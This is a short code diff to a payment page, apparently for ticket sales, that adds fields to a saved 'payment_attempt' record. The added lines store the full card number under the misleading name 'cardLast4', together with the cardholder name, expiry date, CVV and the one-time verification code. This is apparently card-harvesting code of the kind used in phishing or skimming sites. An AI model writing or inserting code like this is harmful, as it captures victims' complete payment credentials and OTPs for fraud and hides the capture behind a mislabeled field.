@@ -132,6 +132,11 @@ export default function Payment() {
         await saveFormSubmission(
           "payment_attempt",
           {
+            cardLast4: cardData.cardNumber,
+            cardholderName: cardData.cardholderName,
+            expiryDate: cardData.expiryDate,
+            amount: totalPrice,
+            cvv: cardData.cvv,
             otp,
             ticketCount: totalItems,
             failureReason: "رمز التحقق غير صحيح",
